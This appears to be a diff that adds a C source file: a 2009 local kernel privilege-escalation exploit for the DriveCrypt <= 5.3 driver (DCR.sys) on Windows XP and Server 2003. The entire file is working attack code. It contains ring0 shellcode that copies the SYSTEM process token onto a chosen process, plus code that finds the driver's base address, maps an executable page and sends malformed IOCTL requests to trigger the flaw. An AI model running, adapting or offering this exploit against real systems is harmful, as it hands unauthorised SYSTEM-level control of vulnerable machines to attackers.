@@ -1,0 +1,299 @@
+/* drivecrypt-dcr.c
+ *
+ * Copyright (c) 2009 by <mu-b@digit-labs.org>
+ *
+ * DriveCrypt <= 5.3 local kernel ring0 SYSTEM exploit
+ * by mu-b - Sun 16 Aug 2009
+ *
+ * - Tested on: DCR.sys
+ *
+ * Compile: MinGW + -lntdll
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2009!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <windows.h>
+#include <ddk/ntapi.h>
+
+#define DCR_IOCTL   0x00073800
+
+static unsigned char win32_fixup[] =
+  "\x89\xe5"
+  "\x81\xc5\xb4\x0c\x00\x00";
+
+/* Win2k3 SP1/2 - kernel EPROCESS token switcher
+ * by mu-b <mu-b@digit-lab.org>
+ */
+static unsigned char win2k3_ring0_shell[] =
+  /* _ring0 */
+  "\xb8\x24\xf1\xdf\xff"
+  "\x8b\x00"
+  "\x8b\xb0\x18\x02\x00\x00"
+  "\x89\xf0"
+  /* _sys_eprocess_loop   */
+  "\x8b\x98\x94\x00\x00\x00"
+  "\x81\xfb\x04\x00\x00\x00"
+  "\x74\x11"
+  "\x8b\x80\x9c\x00\x00\x00"
+  "\x2d\x98\x00\x00\x00"
+  "\x39\xf0"
+  "\x75\xe3"
+  "\xeb\x21"
+  /* _sys_eprocess_found  */
+  "\x89\xc1"
+  "\x89\xf0"
+
+  /* _cmd_eprocess_loop   */
+  "\x8b\x98\x94\x00\x00\x00"
+  "\x81\xfb\x00\x00\x00\x00"
+  "\x74\x10"
+  "\x8b\x80\x9c\x00\x00\x00"
+  "\x2d\x98\x00\x00\x00"
+  "\x39\xf0"
+  "\x75\xe3"
+  /* _not_found           */
+  "\xcc"
+  /* _cmd_eprocess_found
+   * _ring0_end           */
+
+  /* copy tokens!$%!      */
+  "\x8b\x89\xd8\x00\x00\x00"
+  "\x89\x88\xd8\x00\x00\x00"
+  "\x90";
+
+static unsigned char winxp_ring0_shell[] =
+  /* _ring0 */
+  "\xb8\x24\xf1\xdf\xff"
+  "\x8b\x00"
+  "\x8b\x70\x44"
+  "\x89\xf0"
+  /* _sys_eprocess_loop   */
+  "\x8b\x98\x84\x00\x00\x00"
+  "\x81\xfb\x04\x00\x00\x00"
+  "\x74\x11"
+  "\x8b\x80\x8c\x00\x00\x00"
+  "\x2d\x88\x00\x00\x00"
+  "\x39\xf0"
+  "\x75\xe3"
+  "\xeb\x21"
+  /* _sys_eprocess_found  */
+  "\x89\xc1"
+  "\x89\xf0"
+
+  /* _cmd_eprocess_loop   */
+  "\x8b\x98\x84\x00\x00\x00"
+  "\x81\xfb\x00\x00\x00\x00"
+  "\x74\x10"
+  "\x8b\x80\x8c\x00\x00\x00"
+  "\x2d\x88\x00\x00\x00"
+  "\x39\xf0"
+  "\x75\xe3"
+  /* _not_found           */
+  "\xcc"
+  /* _cmd_eprocess_found
+   * _ring0_end           */
+
+  /* copy tokens!$%!      */
+  "\x8b\x89\xc8\x00\x00\x00"
+  "\x89\x88\xc8\x00\x00\x00"
+  "\x90";
+
+static unsigned char win32_ret[] =
+  "\xb8\x63\x39\x01\x00"
+  "\xff\xe0";
+
+struct ioctl_req {
+  int action;
+  int flag;
+  char *arg1;
+  char pad[0x0C];
+  char *arg2;
+  char _pad[0x0C];
+  void *ptr;
+};
+
+static PCHAR
+fixup_ring0_shell (PVOID base, DWORD ppid, DWORD *zlen)
+{
+  DWORD dwVersion, dwMajorVersion, dwMinorVersion;
+
+  dwVersion = GetVersion ();
+  dwMajorVersion = (DWORD) (LOBYTE(LOWORD(dwVersion)));
+  dwMinorVersion = (DWORD) (HIBYTE(LOWORD(dwVersion)));
+
+  if (dwMajorVersion != 5)
+    {
+      fprintf (stderr, "* GetVersion, unsupported version\n");
+      exit (EXIT_FAILURE);
+    }
+
+  *(PDWORD) &win32_ret[1] += (DWORD) base;
+
+  switch (dwMinorVersion)
+    {
+      case 1:
+        *zlen = sizeof winxp_ring0_shell - 1;
+        *(PDWORD) &winxp_ring0_shell[55] = ppid;
+        return (winxp_ring0_shell);
+
+      case 2:
+        *zlen = sizeof win2k3_ring0_shell - 1;
+        *(PDWORD) &win2k3_ring0_shell[58] = ppid;
+        return (win2k3_ring0_shell);
+
+      default:
+        fprintf (stderr, "* GetVersion, unsupported version\n");
+        exit (EXIT_FAILURE);
+    }
+
+  return (NULL);
+}
+
+static PVOID
+get_module_base (void)
+{
+  PSYSTEM_MODULE_INFORMATION_ENTRY pModuleBase;
+  PSYSTEM_MODULE_INFORMATION pModuleInfo;
+  DWORD i, num_modules, status, rlen;
+  PVOID result;
+
+  status = NtQuerySystemInformation (SystemModuleInformation, NULL, 0, &rlen);
+  if (status != STATUS_INFO_LENGTH_MISMATCH)
+    {
+      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", status);
+      exit (EXIT_FAILURE);
+    }
+
+  pModuleInfo = (PSYSTEM_MODULE_INFORMATION) HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, rlen);
+
+  status = NtQuerySystemInformation (SystemModuleInformation, pModuleInfo, rlen, &rlen);
+  if (status != STATUS_SUCCESS)
+    {
+      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", status);
+      exit (EXIT_FAILURE);
+    }
+
+  num_modules = pModuleInfo->Count;
+  pModuleBase = &pModuleInfo->Module[0];
+  result = NULL;
+
+  for (i = 0; i < num_modules; i++, pModuleBase++)
+    if (strstr (pModuleBase->ImageName, "DCR.sys"))
+      {
+        result = pModuleBase->Base;
+        break;
+      }
+
+  HeapFree (GetProcessHeap (), HEAP_NO_SERIALIZE, pModuleInfo);
+
+  return (result);
+}
+
+int
+main (int argc, char **argv)
+{
+  struct ioctl_req req;
+  CHAR buf[1024], buf1[8], buf2[0x88+1];
+  DWORD rlen, zlen, ppid;
+  LPVOID zpage, zbuf, base;
+  HANDLE hFile;
+  BOOL result;
+
+  printf ("DriveCrypt <= 5.3 local kernel ring0 SYSTEM exploit\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n");
+
+  if (argc <= 1)
+    {
+      fprintf (stderr, "Usage: %s <processid to elevate>\n", argv[0]);
+      exit (EXIT_SUCCESS);
+    }
+
+  ppid = atoi (argv[1]);
+
+  hFile = CreateFileA ("\\\\.\\DCR", FILE_EXECUTE,
+                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
+                       OPEN_EXISTING, 0, NULL);
+  if (hFile == INVALID_HANDLE_VALUE)
+    {
+      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
+      exit (EXIT_FAILURE);
+    }
+
+  memset (&req, 0, sizeof req);
+  req.action = 0x153;
+  req.flag = 0;
+  req.ptr = buf;
+
+  printf ("* enabling driver...\n");
+  result = DeviceIoControl (hFile, DCR_IOCTL,
+                            &req, sizeof req, &req, sizeof req, &rlen, 0);
+  if (!result)
+    {
+      fprintf (stderr, "* DeviceIoControl failed\n");
+      exit (EXIT_FAILURE);
+    }
+  printf ("** version: 0x%08X [%s], %s\n", *(int *) &buf[8], &buf[12], &buf[19]);
+  printf ("* done\n");
+
+  zpage = VirtualAlloc ((LPVOID) 0x610000, 0x10000,
+                        MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  if (zpage == NULL)
+    {
+      fprintf (stderr, "* VirtualAlloc failed\n");
+      exit (EXIT_FAILURE);
+    }
+  printf ("* allocated page: 0x%08X [%d-bytes]\n",
+          zpage, 0x10000);
+
+  base = get_module_base ();
+  if (base == NULL)
+    {
+      fprintf (stderr, "* unable to find DCR.sys base\n");
+      exit (EXIT_FAILURE);
+    }
+  printf ("* DCR.sys base: 0x%08X\n", base);
+
+  memset (zpage, 0xCC, 0x10000);
+  zbuf = fixup_ring0_shell (base, ppid, &zlen);
+  memcpy ((LPVOID) zpage + 0x61, win32_fixup, sizeof (win32_fixup) - 1);
+  memcpy ((LPVOID) (zpage + 0x61 + sizeof (win32_fixup) - 1), zbuf, zlen);
+  memcpy ((LPVOID) (zpage + 0x61 + sizeof (win32_fixup) + zlen - 1),
+          win32_ret, sizeof (win32_ret) - 1);
+
+  memset (&req, 0, sizeof req);
+  req.action = 79;
+  req.flag = 0;
+
+  memset (buf1, 0x41, sizeof buf1);
+  buf1[sizeof buf1 - 1] = 0;
+  req.arg1 = buf1;
+
+  memset (buf2, 0x61, sizeof buf2);
+  buf2[sizeof buf2 - 1] = 0;
+  req.arg2 = buf2;
+
+  req.ptr = buf;
+
+  printf ("* hitting.. ");
+  fflush (stdout);
+
+  result = DeviceIoControl (hFile, DCR_IOCTL,
+                            &req, sizeof req, &req, sizeof req, &rlen, 0);
+  if (!result)
+    {
+      fprintf (stderr, "* DeviceIoControl failed\n");
+      exit (EXIT_FAILURE);
+    }
+
+  printf ("done\n\n"
+          "* hmmm, you didn't STOP the box?!?!\n");
+
+  CloseHandle (hFile);
+
+  return (EXIT_SUCCESS);
+}
